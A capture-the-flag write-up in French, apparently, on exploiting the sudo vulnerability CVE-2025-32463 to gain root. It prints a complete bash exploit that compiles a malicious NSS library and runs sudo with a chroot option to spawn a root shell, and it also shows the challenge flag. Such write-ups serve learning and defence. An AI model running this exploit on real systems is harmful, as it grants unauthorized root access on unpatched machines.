On parle d'un manque de mise à jour, et le fichier ``.bash_history`` contient la commande `sudo --version` -> il faut se tourner vers une vulnérabilité de sudo

En tapant la même commande et le réusltat sur internet à la recherche d'une CVE, on tombe sur [CVE-2025-32463](https://cyberveille.esante.gouv.fr/alertes/sudo-cve-2025-32463-2025-07-01)

Cette CVE possède de nombreux POC sur internet, on se met donc à chercher un script permettant de facilement exploiter la faille

Par exemple : https://github.com/MAAYTHM/CVE-2025-32462_32463-Lab/blob/main/auto_cve_2025_32463.sh

Sinon voici un code : 
```bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudostage.XXXX)
cd "$STAGE"

cat > xd1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void xd1337(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p xd/etc libnss_
echo "passwd: /xd1337" > xd/etc/nsswitch.conf
cp /etc/group xd/etc/

gcc -shared -fPIC -Wl,-init,xd1337 -o libnss_/xd1337.so.2 xd1337.c

sudo -R xd /bin/true
```

Une fois exécuté sur le serveur, vous devenez root.

On peut ensuite trouver le flag :
```bash
cat /root/flag.txt
```
``CYBN{Mak3_SUr3_T0_uPD4T3_yOuR_SYst3m_4Nd_PAck4G35}``